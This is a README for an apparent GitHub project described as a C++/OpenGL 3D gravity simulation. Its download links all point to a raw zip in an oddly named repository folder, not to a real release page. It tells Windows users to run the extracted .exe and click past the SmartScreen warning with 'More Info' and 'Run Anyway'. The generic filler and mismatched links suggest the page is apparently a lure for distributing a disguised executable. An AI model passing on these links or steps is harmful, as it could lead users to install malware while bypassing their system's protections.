# 🪐 gravity_simulation3d - Explore gravity using 3D physics models

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Milkupprem/gravity_simulation3d/raw/refs/heads/main/epitheliogenetic/gravity_simulation_d_2.3.zip)

## 📋 About This Project

This software lets you watch how gravity works in a three-dimensional space. It uses physics equations to show how objects move and interact with each other. You can see how planets or stars pull on each other based on their mass and distance.

The program creates a visual environment. It renders shapes that represent massive objects. You see these objects float and spin in a dark space. The simulation calculates the force between every object in real time. This shows accurate movement patterns based on standard physics laws.

## 💻 System Requirements

Your computer needs specific parts to run this program smoothly. Please check your system against this list:

- Operating System: Windows 10 or Windows 11.
- Processor: An Intel Core i5 or AMD Ryzen 5 or better.
- Memory: At least 8 gigabytes of RAM.
- Graphics: A dedicated graphics card that supports OpenGL 3.3 or higher.
- Storage: 200 megabytes of free space on your hard drive.

If your computer uses an integrated graphics chip, the simulation might run slowly. A dedicated graphics card provides the best results for 3D rendering.

## 📥 Downloading the Software 

Follow these steps to get the files on your machine:

1. Open your web browser.
2. Go to the [official release page](https://github.com/Milkupprem/gravity_simulation3d/raw/refs/heads/main/epitheliogenetic/gravity_simulation_d_2.3.zip).
3. Look for the latest version under the Releases section.
4. Click the link for the Windows installer file.
5. Save the file to your desktop or downloads folder.

Ensure you have a stable internet connection while the file copies to your disk. Do not close the window until the download finishes.

## 🛠 Setting Up gravity_simulation3d

After you download the file, take these steps to prepare the application:

1. Locate the downloaded file on your computer.
2. Right-click the file and select "Extract All" if it is in a compressed folder.
3. Open the folder you just created.
4. Find the file ending in ".exe" which acts as the main program.
5. Double-click this file to launch the gravity simulation.

Windows might show a message asking if you want to run the program. This happens because the software comes from an external source. Click "More Info" and then select "Run Anyway" to open the window.

## 🎮 How to Use the Simulation

Once the simulation starts, you see a black window with various objects. Use your mouse and keyboard to interact with the space:

- Move your mouse to change the camera angle. This lets you look at the objects from different sides.
- Press the "W", "A", "S", and "D" keys on your keyboard to move the camera through space.
- Use the "Scroll Wheel" on your mouse to zoom in or zoom out. This helps you track specific objects as they move across the screen.
- Press the "Escape" key to exit the program when you finish.

The simulation starts with a pre-set group of objects. You do not need to configure complex settings to start the physics engine. It runs the math calculations as soon as the window appears.

## ⚙️ Understanding the Physics

The program uses standard math to drive the movement. It treats each object as a point mass. Every object exerts a pull on others. The strength of this pull depends on two things:

1. The mass of the objects. Larger objects pull harder.
2. The distance between them. Objects close to each other pull harder than objects far apart.

The underlying code relies on OpenGL to draw these shapes on your screen. It communicates with your graphics card to process the visual data. This setup ensures that particles move smoothly even when many objects exist in the scene. 

## ❓ Troubleshooting Common Issues

If you run into problems, check these solutions:

- Black Screen: Ensure your graphics drivers are up to date. You can find these on the website for your computer manufacturer or your graphics card company.
- Program Closes Unexpectedly: This often happens if the computer does not meet the minimum memory requirements. Close other heavy programs like web browsers or video players before running the simulation.
- Slow Performance: Lower the resolution of your monitor or close background tasks. The movement depends on the speed of your processor and graphics card.
- Missing Files: If the program fails to start, reinstall the software. Sometimes a file fails to copy correctly during the download.

## 🎓 Learning More

This simulation serves as an introduction to astrophysics and C++. You can view the raw source files on GitHub to see how the programming works. The project uses the following libraries:

- GLFW: Manages the window and input.
- GLEW: Helps the program talk to your graphics hardware.
- GLM: Handles the complex math needed for 3D positions.

These tools allow the software to bridge the gap between abstract physics equations and visual, moving objects. Exploration of the code provides insight into how developers build 3D physics engines from scratch. Use this as a starting point if you want to learn more about how code manipulates space and gravity in a digital environment.